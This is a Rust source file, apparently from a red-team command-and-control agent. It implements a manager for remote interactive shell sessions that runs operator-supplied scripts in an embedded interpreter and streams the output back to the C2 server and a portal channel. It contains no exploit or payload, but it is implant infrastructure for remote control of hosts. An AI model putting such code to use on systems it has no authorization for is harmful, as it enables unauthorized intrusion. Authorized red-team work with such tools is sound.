use std::collections::HashMap;
use std::fmt;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::sync::mpsc;

use eldritch::agent::agent::Agent;
use eldritch::assets::std::EmptyAssets;
use eldritch::{Interpreter, Printer, Span};
use pb::c2::{ReportTaskOutputRequest, ShellTask, ShellTaskOutput, TaskContext, TaskError};
use pb::portal::{self, Mote, ShellPayload};
use transport::Transport;

use crate::agent::ImixAgent;

pub enum ShellManagerMessage {
    ProcessTask(ShellTask),
    ProcessPortalPayload(Mote, mpsc::Sender<Mote>),
    Shutdown,
}

struct ShellContext {
    task_id: Option<i64>,
    portal_tx: Option<mpsc::Sender<Mote>>,
    stream_id: Option<String>,
}

#[derive(Clone)]
struct SharedShellContext(Arc<Mutex<ShellContext>>);

impl SharedShellContext {
    fn new() -> Self {
        Self(Arc::new(Mutex::new(ShellContext {
            task_id: None,
            portal_tx: None,
            stream_id: None,
        })))
    }

    fn set_task(&self, task_id: i64) {
        let mut ctx = self.0.lock().unwrap();
        ctx.task_id = Some(task_id);
    }

    fn set_portal(&self, tx: mpsc::Sender<Mote>, stream_id: String) {
        let mut ctx = self.0.lock().unwrap();
        ctx.portal_tx = Some(tx);
        ctx.stream_id = Some(stream_id);
    }

    fn clear_task(&self) {
        let mut ctx = self.0.lock().unwrap();
        ctx.task_id = None;
    }
}

struct ShellPrinter<T: Transport> {
    agent: Arc<ImixAgent<T>>,
    context: SharedShellContext,
    shell_id: i64,
}

impl<T: Transport> fmt::Debug for ShellPrinter<T> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ShellPrinter")
            .field("shell_id", &self.shell_id)
            .finish()
    }
}

impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
    fn print_out(&self, _span: &Span, s: &str) {
        let ctx = self.context.0.lock().unwrap();

        // 1. Report to C2 if task_id is present
        if let Some(task_id) = ctx.task_id {
            let req = ReportTaskOutputRequest {
                shell_task_output: Some(ShellTaskOutput {
                    id: task_id,
                    output: s.to_string(),
                    error: None,
                    exec_started_at: None,
                    exec_finished_at: None,
                }),
                ..Default::default()
            };
            let _ = self.agent.report_task_output(req);
        }

        // 2. Report to Portal if active
        if let Some(tx) = &ctx.portal_tx {
            let stream_id = ctx.stream_id.clone().unwrap_or_default();
            let payload = ShellPayload {
                shell_id: self.shell_id,
                input: s.to_string(),
            };
            let mote = Mote {
                stream_id,
                seq_id: 0,
                payload: Some(portal::mote::Payload::Shell(payload)),
            };

            let tx = tx.clone();
            tokio::spawn(async move {
                let _ = tx.send(mote).await;
            });
        }
    }

    fn print_err(&self, _span: &Span, s: &str) {
        let ctx = self.context.0.lock().unwrap();

        if let Some(task_id) = ctx.task_id {
            let req = ReportTaskOutputRequest {
                shell_task_output: Some(ShellTaskOutput {
                    id: task_id,
                    output: String::new(),
                    error: Some(TaskError { msg: s.to_string() }),
                    exec_started_at: None,
                    exec_finished_at: None,
                }),
                ..Default::default()
            };
            let _ = self.agent.report_task_output(req);
        }

        if let Some(tx) = &ctx.portal_tx {
            let stream_id = ctx.stream_id.clone().unwrap_or_default();
            // Prefix error
            let payload = ShellPayload {
                shell_id: self.shell_id,
                input: format!("Error: {}", s),
            };
            let mote = Mote {
                stream_id,
                seq_id: 0,
                payload: Some(portal::mote::Payload::Shell(payload)),
            };
            let tx = tx.clone();
            tokio::spawn(async move {
                let _ = tx.send(mote).await;
            });
        }
    }
}

pub struct ShellManager<T: Transport + Send + Sync + 'static> {
    agent: Arc<ImixAgent<T>>,
    interpreters: HashMap<i64, InterpreterState>,
    rx: mpsc::Receiver<ShellManagerMessage>,
}

struct InterpreterState {
    interpreter: Interpreter,
    context: SharedShellContext,
    last_activity: Instant,
}

impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
    pub fn new(agent: Arc<ImixAgent<T>>, rx: mpsc::Receiver<ShellManagerMessage>) -> Self {
        Self {
            agent,
            interpreters: HashMap::new(),
            rx,
        }
    }

    pub async fn run(mut self) {
        let cleanup_interval = Duration::from_secs(60);
        let mut cleanup_timer = tokio::time::interval(cleanup_interval);

        loop {
            tokio::select! {
                msg = self.rx.recv() => {
                    match msg {
                        Some(ShellManagerMessage::ProcessTask(task)) => {
                            self.handle_task(task).await;
                        }
                        Some(ShellManagerMessage::ProcessPortalPayload(mote, reply_tx)) => {
                            self.handle_portal_payload(mote, reply_tx).await;
                        }
                        Some(ShellManagerMessage::Shutdown) => {
                            break;
                        }
                        None => {
                            break;
                        }
                    }
                }
                _ = cleanup_timer.tick() => {
                    self.cleanup_inactive_interpreters();
                }
            }
        }
    }

    async fn handle_task(&mut self, task: ShellTask) {
        let shell_id = task.shell_id;
        let state = self.get_or_create_interpreter(shell_id);

        state.last_activity = Instant::now();
        state.context.set_task(task.id);

        let _ = state.interpreter.interpret(&task.input);

        state.context.clear_task();
    }

    async fn handle_portal_payload(&mut self, mote: Mote, reply_tx: mpsc::Sender<Mote>) {
        if let Some(portal::mote::Payload::Shell(shell_payload)) = mote.payload {
            let shell_id = shell_payload.shell_id;
            let stream_id = mote.stream_id.clone();

            let state = self.get_or_create_interpreter(shell_id);

            state.last_activity = Instant::now();
            state.context.set_portal(reply_tx, stream_id);

            let _ = state.interpreter.interpret(&shell_payload.input);
        }
    }

    fn get_or_create_interpreter(&mut self, shell_id: i64) -> &mut InterpreterState {
        self.interpreters.entry(shell_id).or_insert_with(|| {
            let context = SharedShellContext::new();
            let printer = Arc::new(ShellPrinter {
                agent: self.agent.clone(),
                context: context.clone(),
                shell_id,
            });

            // Create dummy TaskContext
            let task_context = TaskContext {
                task_id: 0,
                jwt: String::new(),
            };

            let backend = Arc::new(EmptyAssets {});

            let interpreter = Interpreter::new_with_printer(printer)
                .with_default_libs()
                .with_task_context(self.agent.clone(), task_context, Vec::new(), backend);

            InterpreterState {
                interpreter,
                context,
                last_activity: Instant::now(),
            }
        })
    }

    fn cleanup_inactive_interpreters(&mut self) {
        let now = Instant::now();
        let timeout = Duration::from_secs(3600); // 1 hour
        self.interpreters
            .retain(|_, state| now.duration_since(state.last_activity) < timeout);
    }
}
